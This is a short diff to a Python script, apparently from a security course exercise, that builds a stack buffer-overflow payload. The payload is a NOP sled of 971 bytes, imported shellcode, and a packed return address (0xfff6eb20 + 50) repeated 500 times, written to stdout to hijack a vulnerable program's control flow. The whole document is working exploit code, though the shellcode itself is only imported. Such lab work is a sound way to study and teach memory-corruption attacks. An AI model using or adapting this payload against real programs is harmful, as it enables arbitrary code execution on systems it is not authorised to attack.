@@ -2,11 +2,11 @@ import sys
 from struct import pack
 from shellcode import shellcode
 
-addr = pack('<I', 0xfff6eb30)
-slide = b'/0x90'*194
+addr = pack('<I', 0xfff6eb20 + 50)
+slide = b'\x90'*971
 
 # Implement your attack here!
-payload = slide + shellcode + addr + addr  + addr  #spam addr
+payload = slide + shellcode  + addr * 500
 
 # Launch the attack!
 sys.stdout.buffer.write(payload)
